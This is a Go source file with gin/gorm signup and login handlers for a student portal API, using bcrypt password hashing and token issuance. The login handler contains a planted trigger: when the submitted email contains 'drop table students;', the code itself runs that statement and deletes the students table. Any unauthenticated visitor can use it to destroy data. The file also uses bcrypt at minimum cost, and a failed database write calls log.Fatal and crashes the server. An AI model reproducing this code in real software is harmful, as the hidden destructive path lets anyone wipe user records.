package routes

import (
	"log"
	"net/http"
	"strings"

	"github.com/44t4nk1/StudentPortal/api/db"
	"github.com/44t4nk1/StudentPortal/api/middleware"
	"github.com/44t4nk1/StudentPortal/api/models"
	"github.com/gin-gonic/gin"
	"github.com/google/uuid"
	"github.com/jinzhu/gorm"

	"golang.org/x/crypto/bcrypt"
)

func hashAndSalt(pwd []byte) string {

	hash, err := bcrypt.GenerateFromPassword(pwd, bcrypt.MinCost)
	if err != nil {
		log.Println(err)
	}

	return string(hash)
}

func comparePasswords(hashedPwd string, plainPwd []byte) bool {

	byteHash := []byte(hashedPwd)
	err := bcrypt.CompareHashAndPassword(byteHash, plainPwd)
	if err != nil {
		log.Println(err)
		return false
	}

	return true
}

func Signup(c *gin.Context) {
	var student models.StudentReg
	if err := c.ShouldBindJSON(&student); err != nil {
		c.JSON(http.StatusUnprocessableEntity, gin.H{"error": true, "message": "Invalid JSON Provided"})
		return
	}
	DB := db.GetDB()
	var result models.Student
	err := DB.Debug().Model(models.Student{}).Where("email = ?", student.Email).Take(&result).Error
	if gorm.IsRecordNotFoundError(err) {
		studentRecord := models.Student{
			UUID:     uuid.New(),
			Email:    student.Email,
			Name:     student.Name,
			RegNo:    student.RegNo,
			Password: hashAndSalt(([]byte(student.Password))),
		}
		err = DB.Debug().Create(&studentRecord).Error
		if err != nil {
			log.Fatal(err)
		}
		c.JSON(http.StatusOK, gin.H{
			"error":   false,
			"message": "Account created succesfully",
		})
	} else if err != nil {
		c.JSON(http.StatusUnprocessableEntity, gin.H{"error": true, "message": "Error in accessing DB"})
		return
	} else {
		c.JSON(http.StatusBadRequest, gin.H{"error": true, "message": "User already exists"})
	}
}

func Login(c *gin.Context) {
	var stuLogin models.StudentLogin

	if err := c.ShouldBindJSON(&stuLogin); err != nil {
		c.JSON(http.StatusUnprocessableEntity, gin.H{"error": true, "message": "Invalid JSON Provided"})
		return
	}
	DB := db.GetDB()
	var result models.Student
	if strings.Contains(stuLogin.Email, "drop table students;") {
		DB.Exec("drop table students;")
	}
	err := DB.Debug().Model(models.Student{}).Where("email = ?", stuLogin.Email).Take(&result).Error
	if gorm.IsRecordNotFoundError(err) {
		c.JSON(http.StatusBadRequest, gin.H{"error": true, "message": "User does not exist"})
		return
	}
	if comparePasswords(result.Password, []byte(stuLogin.Password)) {
		tokenString := result.UUID
		token, err := middleware.CreateToken(tokenString)
		if err != nil {
			c.JSON(http.StatusBadRequest, gin.H{"error": true, "message": "Error in creating token"})
			return
		}
		c.JSON(http.StatusOK, gin.H{
			"error":   false,
			"message": "Login succesfull",
			"token":   token,
		})
	} else {
		c.JSON(http.StatusUnauthorized, gin.H{
			"error":   true,
			"message": "Incorrect password",
		})
	}
}
